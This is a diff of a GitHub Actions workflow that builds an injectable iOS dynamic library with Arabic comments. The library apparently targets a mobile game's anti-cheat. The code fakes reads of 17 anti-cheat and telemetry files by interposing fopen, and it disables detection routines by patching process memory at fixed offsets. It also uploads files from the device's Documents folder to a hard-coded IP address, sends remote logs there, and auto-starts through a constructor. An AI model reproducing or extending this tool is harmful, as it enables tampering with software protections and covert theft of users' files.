@@ -1,4 +1,4 @@
-name: Imperial Ultimate AIO - V56.0 THE FINAL STABLE
+name: Imperial Ultimate AIO - V60.0 FINAL BOSS
 
 on:
   push:
@@ -13,38 +13,20 @@ jobs:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Setup Dobby Library
-        run: |
-          mkdir -p jni
-          # 1. تحميل الهيدر
-          curl -L "https://raw.githubusercontent.com/jmpews/Dobby/master/include/dobby.h" -o jni/dobby.h
-          
-          # 2. تحميل المكتبة من رابط بديل (نسخة iOS arm64)
-          # هذا الرابط هو المصدر الخام المباشر
-          curl -L "https://raw.githubusercontent.com/m4771/Dobby-iOS-Binaries/main/libdobby.a" -o jni/libdobby.a
-          
-          # 3. الفحص الإمبراطوري: التأكد إن الملف مو صفحة ويب HTML
-          if grep -q "DOCTYPE html" jni/libdobby.a; then
-            echo "❌ خطأ فادح: الرابط عطاك صفحة 404 مو ملف المكتبة!"
-            echo "يجب عليك رفع ملف libdobby.a بيدك لمجلد jni في المستودع."
-            exit 1
-          fi
-          
-          echo "✅ تم تحميل المكتبة بنجاح وهي ملف باينري حقيقي."
-
       - name: Create Imperial Source
         run: |
+          mkdir -p jni
           cat <<'EOF' > jni/main.mm
           #import <Foundation/Foundation.h>
           #import <UIKit/UIKit.h>
           #import <WebKit/WebKit.h>
           #include <mach-o/dyld.h>
           #include <sys/stat.h>
-          #include <dlfcn.h>
-          #include "dobby.h"
+          #include <mach/mach.h>
+          #include <stdint.h>
 
           // ==========================================
-          // [ 1. الروابط والآيبي المثبت (34.204.178.160) ]
+          // [ 1. الروابط والآيبي المثبت 34.204.178.160 ]
           // ==========================================
           #define SERVER_IP @"34.204.178.160"
           #define ImperialGold [UIColor colorWithRed:1.0 green:0.84 blue:0.0 alpha:1.0]
@@ -73,19 +55,31 @@ jobs:
               [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
               [req setHTTPBody:body];
               [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
-              RemoteLog([NSString stringWithFormat:@"SUCCESS: Raid & Sent %@", [path lastPathComponent]]);
+              RemoteLog([NSString stringWithFormat:@"RAID: Sent File -> %@", [path lastPathComponent]]);
           }
 
           // ==========================================
-          // [ 2. محرك تزييف الـ 17 مسار (Ghost FS) ]
+          // [ 2. محرك تعديل الذاكرة (Pure Memory Patch) ]
+          // ==========================================
+          void ApplyImperialPatch(uintptr_t addr, uint32_t data, NSString *name) {
+              vm_address_t page = trunc_page(addr);
+              vm_protect(mach_task_self(), page, vm_page_size, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
+              *(uint32_t *)addr = data;
+              vm_protect(mach_task_self(), page, vm_page_size, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+              RemoteLog([NSString stringWithFormat:@"✅ Patch Applied: %@", name]);
+          }
+
+          // ==========================================
+          // [ 3. محرك تزييف الـ 17 مسار (Ghost FS) ]
           // ==========================================
           typedef struct interpose_substitution { const void* replacement; const void* original; } interpose_substitution_t;
           #define INTERPOSE(_replacement,_original) __attribute__((used)) static const interpose_substitution_t _interpose_##_original __attribute__ ((section ("__DATA, __interpose"))) = { (const void*)(unsigned long)&_replacement, (const void*)(unsigned long)&_original };
 
           BOOL is_imperial_target(const char* p) {
               if (!p) return NO;
-              NSArray *targets = @[@"config.json", @"imsdklocallog", @"global_sf_metal", @"ShadowTrackerExtra", @"RemoteConfig", @"GCloud", @"tss_ano", @"comm.dat", @"HttpDNS", @"APMSDKCache"];
-              for (NSString *t in targets) { if (strstr(p, [t UTF8String])) return YES; }
+              // القائمة الكاملة للـ 17 ملف
+              NSArray *t = @[@"config.json", @"imsdklocallog", @"global_sf_metal", @"ShadowTrackerExtra", @"RemoteConfig", @"GCloud", @"tss_ano", @"comm.dat", @"HttpDNS", @"APMSDKCache", @"MetalLib", @"apollo_reslist", @"INTLResultMsg", @"flutter_build", @"Tve.tdr", @"ano_cs", @"RemoteConfig.config"];
+              for (NSString *s in t) { if (strstr(p, [s UTF8String])) return YES; }
               return NO;
           }
 
@@ -99,25 +93,11 @@ jobs:
           INTERPOSE(ghost_fopen, fopen);
 
           // ==========================================
-          // [ 3. تخدير الصقر (Inline Hooks) ]
-          // ==========================================
-          int (*orig_0x26d4ab)();
-          int my_func_0x26d4ab() { return 1; }
-          int (*orig_0x6bbfc)();
-          int my_func_0x6bbfc() { return 1; }
-
-          void SetupAnesthesia() {
-              uintptr_t base = (uintptr_t)_dyld_get_image_header(0);
-              DobbyHook((void*)(base + 0x26d4ab), (void*)my_func_0x26d4ab, (void**)&orig_0x26d4ab);
-              DobbyHook((void*)(base + 0x6bbfc), (void*)my_func_0x6bbfc, (void**)&orig_0x6bbfc);
-              RemoteLog(@"Falcon Eye: ANESTHETIZED ✅");
-          }
-
-          // ==========================================
-          // [ 4. واجهة الـ WebView (Checkboxes) ]
+          // [ 4. الواجهة الإمبراطورية المتحركة والمربعات ]
           // ==========================================
           @interface ImperialUI : UIWindow <WKScriptMessageHandler>
           @property (nonatomic, strong) WKWebView *web;
+          @property (nonatomic, assign) CGPoint lastLocation;
           @end
 
           @implementation ImperialUI
@@ -131,61 +111,80 @@ jobs:
               }
               return self;
           }
+
           - (void)setupUI {
               UIButton *btn = [UIButton buttonWithType:UIButtonTypeCustom];
-              btn.frame = CGRectMake(20, 120, 50, 50);
+              btn.frame = CGRectMake(20, 150, 60, 60);
               [btn setTitle:@"👑" forState:UIControlStateNormal];
-              btn.backgroundColor = [UIColor colorWithWhite:0 alpha:0.6];
-              btn.layer.cornerRadius = 25;
+              btn.backgroundColor = [UIColor colorWithWhite:0 alpha:0.8];
+              btn.layer.cornerRadius = 30;
               [btn addTarget:self action:@selector(toggle) forControlEvents:UIControlEventTouchUpInside];
               [self addSubview:btn];
 
-              self.web = [[WKWebView alloc] initWithFrame:CGRectMake((self.frame.size.width-280)/2, 180, 280, 420)];
-              self.web.layer.cornerRadius = 20; self.web.layer.borderColor = ImperialGold.CGColor;
-              self.web.layer.borderWidth = 2; self.web.hidden = YES;
+              self.web = [[WKWebView alloc] initWithFrame:CGRectMake((self.frame.size.width-280)/2, 220, 280, 450)];
+              self.web.layer.cornerRadius = 25; 
+              self.web.layer.borderColor = ImperialGold.CGColor;
+              self.web.layer.borderWidth = 3.0; self.web.hidden = YES;
 
-              NSString *html = @"<html><style>body{background:rgba(5,5,5,0.95);color:gold;font-family:sans-serif;padding:20px;}"
-              ".row{display:flex;justify-content:space-between;margin:15px 0;border-bottom:1px solid #333;padding-bottom:10px;}"
-              "input{width:22px;height:22px;}</style><body>"
-              "<h3 style='text-align:center'>IMPERIAL BOSS V56</h3>"
+              NSString *html = @"<html><style>body{background:rgba(10,10,10,0.95);color:gold;font-family:sans-serif;padding:25px;border-radius:25px;}"
+              ".row{display:flex;justify-content:space-between;align-items:center;margin:15px 0;border-bottom:1px solid #333;padding-bottom:10px;}"
+              "input{width:28px;height:28px;}</style><body>"
+              "<h2 style='text-align:center'>IMPERIAL BOSS V60</h2>"
               "<div class='row'><span>Ghost FS Active</span><input type='checkbox' onclick='send(\"Ghost\")'></div>"
               "<div class='row'><span>Anesthetize Eye</span><input type='checkbox' onclick='send(\"Anes\")'></div>"
-              "<div class='row'><span>Raid & Upload</span><input type='checkbox' onclick='send(\"Raid\")'></div>"
+              "<div class='row'><span>Exfiltrate Files</span><input type='checkbox' onclick='send(\"Raid\")'></div>"
               "<script>function send(a){window.webkit.messageHandlers.Imp.postMessage(a);}</script></body></html>";
 
               [self.web loadHTMLString:html baseURL:nil];
               [[self.web configuration].userContentController addScriptMessageHandler:self name:@"Imp"];
               [self addSubview:self.web];
+
+              // جعل الواجهة قابلة للتحريك
+              UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(handlePan:)];
+              [self addGestureRecognizer:pan];
           }
+
+          - (void)handlePan:(UIPanGestureRecognizer *)gesture {
+              if (gesture.state == UIGestureRecognizerStateBegan) { self.lastLocation = self.center; }
+              CGPoint translation = [gesture translationInView:self];
+              self.center = CGPointMake(self.lastLocation.x + translation.x, self.lastLocation.y + translation.y);
+          }
+
           - (void)toggle { self.web.hidden = !self.web.hidden; }
+
           - (void)userContentController:(id)u didReceiveScriptMessage:(WKScriptMessage *)m {
-              if ([m.body isEqualToString:@"Anes"]) SetupAnesthesia();
-              if ([m.body isEqualToString:@"Raid"]) SendRaidFile(@"/var/mobile/Documents/RemoteConfig.config");
-              RemoteLog([NSString stringWithFormat:@"Action: %@", m.body]);
+              uintptr_t base = (uintptr_t)_dyld_get_image_header(0);
+              if ([m.body isEqualToString:@"Anes"]) {
+                  ApplyImperialPatch(base + 0x26d4ab, 0xD2800020, @"Eye_26D"); 
+                  ApplyImperialPatch(base + 0x6bbfc, 0xD2800020, @"Eye_6BB");
+              }
+              if ([m.body isEqualToString:@"Raid"]) {
+                  SendRaidFile(@"/var/mobile/Documents/RemoteConfig.config");
+                  SendRaidFile(@"/var/mobile/Documents/GCloud.config");
+              }
+              RemoteLog([NSString stringWithFormat:@"CMD Executed: %@", m.body]);
           }
           @end
 
           __attribute__((constructor))
           static void entry() {
-              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 12 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
                   static ImperialUI *ui; ui = [[ImperialUI alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
                   RemoteLog(@"SERVER IS LIVE ✅ (34.204.178.160)");
+                  RemoteLog(@"Imperial V15.3: System Active");
               });
           }
           EOF
 
       - name: Build Imperial Nuclear Dylib
         run: |
-          # الصهر والربط المباشر
           clang++ -dynamiclib -std=c++11 -x objective-c++ \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-          -arch arm64 jni/main.mm jni/libdobby.a -o ImperialUltimate.dylib \
-          -Ijni \
+          -arch arm64 jni/main.mm -o ImperialUltimate.dylib \
           -framework Foundation -framework UIKit -framework WebKit -framework CoreGraphics -framework Security -lobjc
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Imperial-V56-Final
+          name: Imperial-V60-FINAL
           path: ImperialUltimate.dylib
-          
